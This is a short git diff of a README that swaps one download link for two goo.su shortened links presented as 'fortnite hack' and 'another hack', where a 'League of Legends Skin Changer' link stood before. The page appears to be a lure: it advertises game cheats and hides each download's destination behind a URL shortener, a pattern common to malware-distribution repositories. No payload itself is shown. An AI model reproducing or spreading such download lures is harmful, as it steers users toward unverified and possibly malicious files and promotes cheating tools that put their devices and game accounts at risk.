@@ -35,8 +35,13 @@ To download the latest version, click the link below:
 <table>
   <tr>
     <td align="center">
-      <a href="https://goo.su/8JkIFPu">
-        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="League of Legends Skin Changer" width="250">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="fortnite hack" width="250">
+      </a>
+    </td>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/ElONjJV.jpeg" alt="another hack" width="250">
       </a>
     </td>
   </tr>
